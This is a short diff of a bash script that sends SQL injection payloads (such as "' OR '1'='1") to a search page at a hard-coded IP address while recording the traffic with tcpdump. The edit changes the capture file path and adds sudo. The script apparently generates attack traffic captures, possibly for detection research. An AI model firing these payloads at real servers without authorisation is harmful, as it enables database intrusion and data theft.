@@ -2,7 +2,7 @@
 
 TARGET="http://205.174.165.68/search.php"
 INTERFACE="eth0"
-PCAP_FILE="sql_injection_$(date +%Y%m%d_%H%M%S).pcap"
+PCAP_FILE="pcap/sql_injection_$(date +%Y%m%d_%H%M%S).pcap"
 
 PAYLOADS=(
   "' OR '1'='1"
@@ -23,7 +23,7 @@ PAYLOADS=(
 )
 
 echo "[*] Starting tcpdump..."
-tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
+sudo tcpdump -i "$INTERFACE" host 205.174.165.68 -w "$PCAP_FILE" &
 TCPDUMP_PID=$!
 
 for payload in "${PAYLOADS[@]}"; do
